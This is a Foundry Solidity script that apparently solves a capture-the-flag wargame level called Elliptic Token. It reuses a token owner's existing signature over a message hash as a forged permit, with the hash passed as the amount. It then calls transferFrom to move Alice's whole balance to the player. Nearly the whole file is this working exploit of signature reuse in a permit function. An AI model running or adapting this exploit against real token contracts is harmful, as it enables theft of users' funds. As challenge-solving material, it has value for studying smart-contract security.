// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {EllipticToken} from "../src/EllipticToken.sol";
import {ECDSA} from "openzeppelin-contracts/contracts/utils/cryptography/ECDSA.sol";

contract EllipticCoinScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address playerAddr = msg.sender;
        address instanceAddr = 0x63d3f014cD2f151850BC90c7205f270Afba7b949;
        address aliceAddr = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;

        EllipticToken ellipticToken = EllipticToken(instanceAddr);

        uint256 aliceBalance = ellipticToken.balanceOf(aliceAddr);

        uint256 amount = uint256(0x58f72b1021580008675c0d96c6c45ee2a810cc5dbd8ecdebd9d3bea2e99300fa); // message hash

        bytes memory tokenOwnerSignature =
            hex"e6317983a383d654a6423adb6776884bdb3e48a4e9cc1e362d30ba741d91bacd275774f92c4ef1ddd50e691b9b44cd0a80ed9762ed74368ed289578a8641b21e1b";

        bytes32 permitHash = keccak256(abi.encodePacked(aliceAddr, playerAddr, amount));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerAddr, permitHash); // sign the permit hash with spender

        bytes memory spenderSignature = abi.encodePacked(r, s, v);

        ellipticToken.permit(amount, playerAddr, tokenOwnerSignature, spenderSignature);
        ellipticToken.transferFrom(aliceAddr, playerAddr, aliceBalance);

        uint256 playerBalance = ellipticToken.balanceOf(playerAddr);

        console.log("Player Balance after transfer:", playerBalance);

        vm.stopBroadcast();
    }
}